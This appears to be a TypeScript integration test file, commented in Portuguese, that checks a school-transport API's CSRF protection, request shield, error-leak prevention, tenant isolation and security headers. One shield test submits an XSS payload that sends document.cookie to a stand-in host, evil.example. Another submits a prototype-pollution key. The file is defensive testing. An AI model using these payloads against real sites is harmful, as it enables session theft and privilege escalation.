import { describe, it, expect, beforeEach } from 'vitest';
import { prisma } from '../../src/lib/prisma';
import { runUnscoped } from '../../src/lib/request-context';
import { criarEmpresa, criarUsuario, autenticar, Cliente, type Empresa } from '../helpers/factory';

/**
 * Defesas de borda vistas de fora.
 *
 * O escudo, o CSRF e o handler de erro so valem se estiverem ligados na rota de
 * verdade — testar as funcoes isoladamente prova que o regex casa, nao que o
 * pedido malicioso e barrado. Aqui tudo passa pelo Express montado.
 */

let alfa: Empresa;
let beta: Empresa;

const ALUNO = { school: 'Colegio Sao Bento', shift: 'MORNING' as const, monthlyFee: 400 };

beforeEach(async () => {
  alfa = await criarEmpresa('Empresa Alfa', '11222333000181');
  beta = await criarEmpresa('Empresa Beta', '44555666000199');
  await criarUsuario(alfa, 'OWNER', 'dono.alfa@teste.com.br');
  await criarUsuario(beta, 'OWNER', 'dono.beta@teste.com.br');
});

/**
 * O sentinela grava a trilha em `void audit(...)` — de proposito, para o
 * bloqueio nao esperar o banco. Observar esse efeito exige aguardar, e nao um
 * SELECT imediato: o teste que le na hora passa ou falha conforme o humor do
 * agendador.
 */
async function esperarTrilha(action: string, timeoutMs = 3000): Promise<number> {
  const limite = Date.now() + timeoutMs;
  for (;;) {
    const [linha] = await runUnscoped('check', () =>
      prisma.$queryRaw<Array<{ n: bigint }>>`SELECT count(*) AS n FROM "AuditLog" WHERE action = ${action}`,
    );
    const total = Number(linha!.n);
    if (total > 0 || Date.now() > limite) return total;
    await new Promise((r) => setTimeout(r, 50));
  }
}

describe('CSRF', () => {
  it('POST autenticado sem o header x-csrf-token e recusado com 403', async () => {
    const dono = await autenticar('dono.alfa@teste.com.br');

    const res = await dono.postSemCsrf('/api/v1/students', { ...ALUNO, name: 'Vitima de CSRF' });
    expect(res.status).toBe(403);
    expect(res.body.error.code).toBe('CSRF_TOKEN_MISSING');

    const nenhum = await runUnscoped('check', () =>
      prisma.$queryRaw<Array<{ n: bigint }>>`SELECT count(*) AS n FROM "Student"`,
    );
    expect(Number(nenhum[0]!.n)).toBe(0);

    // Com o header, a MESMA sessao escreve normalmente: a defesa e o token, nao
    // um bloqueio geral que quebraria o produto.
    expect((await dono.post('/api/v1/students', { ...ALUNO, name: 'Aluno Legitimo' })).status).toBe(201);
  });

  it('login e webhook seguem funcionando sem token de CSRF (ainda nao ha cookie)', async () => {
    // Exigir CSRF em quem ainda nao recebeu cookie nenhum quebraria o primeiro
    // contato do cliente com a API.
    const res = await new Cliente().login('dono.alfa@teste.com.br');
    expect(res.status).toBe(200);
  });
});

describe('sentinela', () => {
  it('recusa payload de XSS com 400 e registra o bloqueio', async () => {
    const dono = await autenticar('dono.alfa@teste.com.br');

    const res = await dono.post('/api/v1/students', {
      ...ALUNO,
      name: '<script>fetch("//evil.example/"+document.cookie)</script>',
    });

    expect(res.status).toBe(400);
    expect(res.body.error.code).toBe('REQUEST_REJECTED');
    // A resposta nao devolve o payload: eco de conteudo hostil e outro vetor.
    expect(JSON.stringify(res.body)).not.toContain('script');

    expect(await esperarTrilha('SECURITY_SHIELD_BLOCK')).toBeGreaterThanOrEqual(1);
  });

  it('recusa chave de poluicao de prototipo', async () => {
    const dono = await autenticar('dono.alfa@teste.com.br');
    const res = await dono.post('/api/v1/students', {
      ...ALUNO,
      name: 'Aluno Comum',
      constructor: { isAdmin: true },
    });
    expect(res.status).toBe(400);
    expect(res.body.error.code).toBe('REQUEST_REJECTED');
  });

  it('aceita nome legitimo com apostrofo — o falso positivo custa mais que o ataque', async () => {
    const dono = await autenticar('dono.alfa@teste.com.br');

    const res = await dono.post('/api/v1/students', {
      ...ALUNO,
      name: "Maria D'Avila Sant'Ana",
      address: "Rua Uni' Bar, 400 - apto 71-B",
    });

    expect(res.status).toBe(201);
    expect(res.body.name).toBe("Maria D'Avila Sant'Ana");
  });
});

describe('resposta de erro', () => {
  it('erro 500 nao vaza stack, SQL nem mensagem interna', async () => {
    // Usuario sem empresa vinculada: o guard do Prisma falha fechado na
    // primeira consulta escopada, e o que interessa e COMO isso chega ao cliente.
    await criarUsuario(null, 'OWNER', 'sem.empresa@teste.com.br');
    const orfao = await autenticar('sem.empresa@teste.com.br');

    const res = await orfao.get('/api/v1/students');
    expect(res.status).toBe(500);
    expect(res.body.error.code).toBe('INTERNAL_ERROR');
    expect(res.body.error.message).toBe('Erro interno. A equipe foi notificada.');
    expect(res.body.error).not.toHaveProperty('stack');

    const corpo = JSON.stringify(res.body);
    for (const vazamento of ['prisma', 'Prisma', 'SELECT', 'tenant', 'Tenant', 'node_modules', '.ts:']) {
      expect(corpo, `resposta de erro contem "${vazamento}"`).not.toContain(vazamento);
    }
  });

  it('todo erro devolve x-request-id, e o header sai em resposta de sucesso tambem', async () => {
    const dono = await autenticar('dono.alfa@teste.com.br');

    const ok = await dono.get('/api/v1/students');
    expect(ok.headers['x-request-id']).toMatch(/^[A-Za-z0-9_-]{8,64}$/);

    const naoExiste = await dono.get('/api/v1/rota/que/nao/existe');
    expect(naoExiste.status).toBe(404);
    expect(naoExiste.headers['x-request-id']).toBeTruthy();
    expect(naoExiste.body.error.requestId).toBe(naoExiste.headers['x-request-id']);

    const semSessao = await new Cliente().get('/api/v1/students');
    expect(semSessao.status).toBe(401);
    expect(semSessao.headers['x-request-id']).toBeTruthy();
  });

  it('erro de acesso cruzado nao devolve nada da outra empresa', async () => {
    const donoBeta = await autenticar('dono.beta@teste.com.br');
    const alunoBeta = await donoBeta.post('/api/v1/students', { ...ALUNO, name: 'Sofia Beta' });
    expect(alunoBeta.status).toBe(201);

    const donoAlfa = await autenticar('dono.alfa@teste.com.br');
    const res = await donoAlfa.get(`/api/v1/students/${alunoBeta.body.id}`);

    expect(res.status).toBe(404);
    const corpo = JSON.stringify(res.body);
    expect(corpo).not.toContain(beta.id);
    expect(corpo).not.toContain('Sofia');
    expect(corpo).not.toContain('Empresa Beta');
  });
});

describe('empresa suspensa', () => {
  it('recebe 402 em toda rota autenticada, de leitura ou de escrita', async () => {
    const dono = await autenticar('dono.alfa@teste.com.br');
    expect((await dono.get('/api/v1/students')).status).toBe(200);

    await runUnscoped('fixture', () =>
      prisma.company.update({
        where: { id: alfa.id },
        data: { tenantStatus: 'SUSPENDED', suspendedAt: new Date() },
      }),
    );

    for (const rota of ['/api/v1/students', '/api/v1/vehicles', '/api/v1/auth/me', '/api/v1/company/me']) {
      const res = await dono.get(rota);
      expect(res.status, `GET ${rota}`).toBe(402);
      expect(res.body.error.code).toBe('ACCOUNT_SUSPENDED');
    }

    const escrita = await dono.post('/api/v1/students', { ...ALUNO, name: 'Nao Deveria Entrar' });
    expect(escrita.status).toBe(402);

    const nenhum = await runUnscoped('check', () =>
      prisma.$queryRaw<Array<{ n: bigint }>>`SELECT count(*) AS n FROM "Student"`,
    );
    expect(Number(nenhum[0]!.n)).toBe(0);

    // A empresa vizinha nao e afetada pela suspensao desta.
    const donoBeta = await autenticar('dono.beta@teste.com.br');
    expect((await donoBeta.get('/api/v1/students')).status).toBe(200);
  });
});

describe('cabecalhos de resposta', () => {
  it('envia os headers de seguranca que auditoria externa procura', async () => {
    const dono = await autenticar('dono.alfa@teste.com.br');
    const res = await dono.get('/api/v1/students');

    expect(res.headers['x-frame-options']).toBe('DENY');
    expect(res.headers['x-content-type-options']).toBe('nosniff');
    expect(res.headers['referrer-policy']).toBe('no-referrer');
    expect(res.headers['permissions-policy']).toContain('camera=()');
    expect(res.headers['permissions-policy']).toContain('geolocation=()');
    expect(res.headers['content-security-policy']).toContain("frame-ancestors 'none'");
    expect(res.headers).not.toHaveProperty('x-powered-by');
  });
});
